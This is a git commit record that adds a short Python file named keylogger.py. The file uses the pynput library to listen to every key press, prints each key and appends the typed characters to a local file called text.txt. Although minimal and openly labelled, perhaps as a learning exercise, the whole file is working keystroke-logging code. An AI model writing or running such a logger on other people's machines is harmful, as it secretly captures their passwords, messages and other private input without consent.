5038e5986fb115cc35da39f388636098fdcd0e52
Kamil Seternus <60841895+kseternus@users.noreply.github.com>
2023-11-27 12:26:03 +0100

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,15 @@
+from pynput import keyboard
+
+def keyPress(key):
+    print(str(key))
+    with open('text.txt', 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print('Error while getting char')
+
+if __name__ == '__main__':
+    listener = keyboard.Listener(on_press=keyPress)
+    listener.start()
+    input()
